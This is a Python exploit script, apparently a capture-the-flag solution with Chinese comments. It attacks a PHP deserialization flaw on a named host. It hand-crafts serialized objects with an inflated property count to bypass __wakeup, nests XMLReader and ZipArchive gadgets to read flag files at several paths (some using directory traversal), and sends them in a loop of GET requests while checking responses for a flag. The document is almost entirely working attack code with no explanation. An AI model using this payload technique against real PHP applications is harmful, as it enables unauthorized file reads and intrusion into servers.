import requests
import re

base_url = "http://f7c8a2a3.clsadp.com/?data="

# 构造最终的payload - 尝试用不同的类和路径
test_cases = [
    # XMLReader with different paths
    ("XMLReader", "/flag", None),
    ("XMLReader", "flag", None),
    ("XMLReader", "/var/www/html/flag", None),
    ("XMLReader", "/tmp/flag", None),
    ("XMLReader", "../flag", None),
    ("XMLReader", "../../flag", None),
    
    # ZipArchive
    ("ZipArchive", "/flag", 0),
    ("ZipArchive", "flag", 0),
]

print("="*70)
print("Systematic testing with bypassed __wakeup")
print("="*70)

for class_name, path, third_param in test_cases:
    # 根据参数类型构造payload
    if third_param is None:
        # NULL
        third_str = "N"
    else:
        # Integer
        third_str = f"i:{third_param}"
    
    # 构造序列化字符串（手工构造，绕过__wakeup）
    payload = f'O:7:"install":3:{{s:17:"\x00install\x00username";O:7:"install":3:{{s:17:"\x00install\x00username";O:5:"Until":3:{{s:1:"a";s:{len(class_name)}:"{class_name}";s:1:"b";s:{len(path)}:"{path}";s:1:"c";{third_str};}}s:17:"\x00install\x00password";s:5:"pass2";}}s:17:"\x00install\x00password";s:5:"pass1";}}'
    
    from urllib.parse import quote
    encoded_payload = quote(payload, safe='')
    full_url = base_url + encoded_payload
    
    print(f"\n[*] Testing: {class_name} with path '{path}'")
    
    try:
        response = requests.get(full_url, timeout=15)
        
        # 检查响应中是否有特殊内容
        if "flag{" in response.text.lower() or "ctf{" in response.text.lower():
            print(f"[!!!] POTENTIAL FLAG FOUND!")
            print(response.text)
            break
        elif len(response.text) != 7418:  # 正常响应的长度
            print(f"[+] Different response length: {len(response.text)}")
            print(f"Response excerpt: {response.text[-200:]}")
        else:
            print(f"[-] Standard response (length: {len(response.text)})")
            
    except Exception as e:
        print(f"[!] Error: {e}")

print("\n" + "="*70)
print("Testing complete")
print("="*70)
